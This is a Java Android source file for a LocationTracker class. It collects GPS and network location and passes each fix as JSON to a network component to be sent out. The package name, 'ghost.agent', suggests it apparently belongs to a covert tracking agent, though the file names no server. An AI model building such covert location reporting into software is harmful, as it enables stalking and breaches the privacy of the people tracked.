package com.ghost.agent.core;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import androidx.core.content.ContextCompat;

import org.json.JSONObject;

public class LocationTracker {
    
    private static final String TAG = "LocationTracker";
    
    private Context context;
    private NetworkManager networkManager;
    private LocationManager locationManager;
    private LocationListener listener;
    private Location lastLocation;
    private boolean isTracking = false;
    private Handler handler = new Handler(Looper.getMainLooper());
    
    public LocationTracker(Context context, NetworkManager networkManager) {
        this.context = context;
        this.networkManager = networkManager;
        this.locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
        
        listener = new LocationListener() {
            @Override
            public void onLocationChanged(Location location) {
                lastLocation = location;
                if (isTracking) sendLocation(location);
            }
            
            @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
            @Override public void onProviderEnabled(String provider) {}
            @Override public void onProviderDisabled(String provider) {}
        };
    }
    
    public void startTracking(int intervalSeconds) {
        if (isTracking || !checkPermission()) return;
        
        try {
            locationManager.requestLocationUpdates(
                LocationManager.GPS_PROVIDER,
                intervalSeconds * 1000L, 10, listener
            );
            locationManager.requestLocationUpdates(
                LocationManager.NETWORK_PROVIDER,
                intervalSeconds * 1000L, 10, listener
            );
            isTracking = true;
            Log.i(TAG, "Tracking démarré");
        } catch (SecurityException e) {
            Log.e(TAG, "Erreur: " + e.getMessage());
        }
    }
    
    public void stopTracking() {
        if (!isTracking) return;
        
        try {
            locationManager.removeUpdates(listener);
            isTracking = false;
            Log.i(TAG, "Tracking arrêté");
        } catch (SecurityException e) {
            Log.e(TAG, "Erreur: " + e.getMessage());
        }
    }
    
    public JSONObject getLocation() {
        if (!checkPermission()) return null;
        
        try {
            Location gps = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (gps != null) return toJson(gps);
            
            Location network = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (network != null) return toJson(network);
            
        } catch (SecurityException e) {
            Log.e(TAG, "Erreur: " + e.getMessage());
        }
        return null;
    }
    
    public void sendLocation() {
        JSONObject loc = getLocation();
        if (loc != null) networkManager.sendLocation(loc);
    }
    
    private void sendLocation(Location location) {
        networkManager.sendLocation(toJson(location));
    }
    
    private JSONObject toJson(Location loc) {
        JSONObject json = new JSONObject();
        try {
            json.put("lat", loc.getLatitude());
            json.put("lng", loc.getLongitude());
            json.put("accuracy", loc.getAccuracy());
            json.put("altitude", loc.getAltitude());
            json.put("speed", loc.getSpeed());
            json.put("bearing", loc.getBearing());
            json.put("provider", loc.getProvider());
            json.put("time", loc.getTime());
        } catch (Exception e) {
            e.printStackTrace();
        }
        return json;
    }
    
    private boolean checkPermission() {
        return ContextCompat.checkSelfPermission(context, 
            Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED;
    }
}
